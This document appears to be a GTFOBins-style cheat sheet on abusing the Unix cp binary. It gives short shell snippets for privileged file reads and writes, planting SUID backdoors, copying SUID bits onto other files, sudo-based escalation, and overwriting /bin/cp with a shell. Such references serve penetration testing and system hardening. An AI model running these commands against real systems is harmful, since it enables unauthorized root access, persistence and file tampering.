# GTFOBin: cp

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

```
LFILE=file_to_write
echo "DATA" | cp /dev/stdin "$LFILE"
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
LFILE=file_to_read
cp "$LFILE" /dev/stdout
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which cp) .

LFILE=file_to_write
echo "DATA" | ./cp /dev/stdin "$LFILE"
```

This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)

```
sudo install -m =xs $(which cp) .

LFILE=file_to_write
TF=$(mktemp)
echo "DATA" > $TF
./cp $TF $LFILE
```

This can copy SUID permissions from any SUID binary (e.g., `cp` itself) to another.

```
sudo install -m =xs $(which cp) .

LFILE=file_to_change
./cp --attributes-only --preserve=all ./cp "$LFILE"
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
LFILE=file_to_write
echo "DATA" | sudo cp /dev/stdin "$LFILE"
```

This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)

```
LFILE=file_to_write
TF=$(mktemp)
echo "DATA" > $TF
sudo cp $TF $LFILE
```

This overrides `cp` itself with a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `cp` by path. Warning, this is a destructive action.

```
sudo cp /bin/sh /bin/cp
sudo cp
```